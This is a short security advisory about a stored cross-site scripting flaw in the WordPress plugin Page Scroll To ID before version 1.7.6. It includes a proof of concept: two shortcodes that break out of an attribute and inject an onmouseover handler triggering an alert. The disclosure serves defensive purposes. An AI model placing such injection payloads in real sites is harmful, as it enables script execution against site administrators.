## WordPress Plugin Vulnerabilities

# Page Scroll To ID < 1.7.6 - Contributor+ Stored XSS

### Description

The plugin does not validate and escape some of its shortcode attributes before outputting them back in the page, which could allow users with a role as low as contributor to perform Stored Cross-Site Scripting attacks which could be used against high privilege users such as admins.

### Proof of Concept

Put the following shortcodes in a page/post:
1. [ps2id url='#' class='" onmouseover="alert(/XSS/)']ClickMe![/ps2id]
2. [ps2id\_wrap id='" onmouseover="alert(/XSS/)']ClickMe![/ps2id\_wrap]
The XSS will be triggered when previewing/viewing the related post/page and moving the mouse over the "ClickMe!" (the theme must be compatible with the plugin, this was tested with Twenty Seventeen).
